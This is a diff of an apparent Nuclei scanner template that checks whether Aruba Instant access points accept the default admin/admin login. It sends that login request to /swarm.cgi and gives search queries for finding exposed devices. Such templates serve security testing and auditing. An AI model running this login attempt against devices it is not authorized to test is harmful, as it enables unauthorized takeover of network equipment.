@@ -1,44 +1,40 @@
 id: aruba-instant-default-login
-
 info:
   name: Aruba Instant - Default Login
   author: SleepingBag945
   severity: high
   description: |
-    Aruba Instant default login credentials were discovered.
+    Aruba Instant is an AP device. The device has a default password, and attackers can control the entire platform through the default password admin/admin vulnerability, and use administrator privileges to operate core functions.
   reference:
     - https://www.192-168-1-1-ip.co/aruba-networks/routers/179/#:~:text=The%20default%20username%20for%20your,control%20panel%20of%20your%20router.
   classification:
     cpe: cpe:2.3:a:arubanetworks:aruba_instant:*:*:*:*:*:*:*:*
   metadata:
     runzero-match: service["http.body"] matches "(?i)jscripts/third_party/raphael-treemap\\.min\\.js"
-    verified: true
-    max-request: 1
-    vendor: arubanetworks
-    product: aruba_instant
     fofa-query: body="jscripts/third_party/raphael-treemap.min.js" || body="jscripts/third_party/highcharts.src.js"
+    max-request: 1
+    product: aruba_instant
+    vendor: arubanetworks
+    verified: true
   tags: aruba,default-login,vuln
-
 http:
-  - raw:
+  - attack: pitchfork
+    host-redirects: true
+    matchers:
+      - condition: and
+        dsl:
+          - status_code_1 == 200
+          - contains(body_1,"name=\"sid") && contains(body_1,"true\">Admin")
+        type: dsl
+    payloads:
+      password:
+        - admin
+      username:
+        - admin
+    raw:
       - |
         POST /swarm.cgi  HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         opcode=login&user={{username}}&passwd={{password}}&refresh=false&nocache=0.17699820340903838
-
-    attack: pitchfork
-    payloads:
-      username:
-        - admin
-      password:
-        - admin
-    host-redirects: true
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code_1 == 200'
-          - 'contains(body_1,"name=\"sid") && contains(body_1,"true\">Admin")'
-        condition: and
-
